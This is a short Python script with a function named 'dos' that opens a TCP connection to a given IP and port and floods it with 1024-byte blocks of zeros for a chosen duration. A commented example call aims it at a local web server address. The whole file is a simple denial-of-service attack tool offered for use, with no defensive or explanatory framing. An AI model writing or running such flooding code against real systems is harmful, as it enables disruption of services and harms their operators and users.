import socket
import time

def dos(ip, port, duration):
    # Create a TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the target IP and port
    s.connect((ip, port))

    # Send data continuously for the specified duration
    start_time = time.time()
    while time.time() - start_time < duration:
        s.send(b'0' * 1024)

# Example usage
#dos('192.168.1.100', 80, 60)